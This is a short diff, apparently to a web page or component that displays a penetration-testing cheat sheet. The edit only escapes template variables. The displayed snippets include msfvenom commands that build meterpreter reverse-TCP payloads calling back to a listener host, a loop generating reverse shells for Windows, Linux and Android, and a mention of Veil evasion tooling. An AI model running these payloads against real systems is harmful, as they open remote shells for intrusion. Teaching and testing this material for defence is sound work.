@@ -731,7 +731,7 @@ LHOST="192.168.1.100"
 LPORT="4444"
 FORMAT="exe"
 DATE=$(date +%Y%m%d_%H%M%S)
-OUTPUT="payload_${DATE}.exe"
+OUTPUT="payload_\${DATE}.exe"
 
 msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $FORMAT -o $OUTPUT
 
@@ -1029,7 +1029,7 @@ veil → Evasion → Go → meterpreter/rev_tcp.py
 #!/bin/bash
 # Auto-generate payloads for different targets:
 for platform in windows linux android; do
-    msfvenom -p ${platform}/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > ${platform}_shell.exe
+    msfvenom -p \${platform}/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > \${platform}_shell.exe
 done`}
       />
 
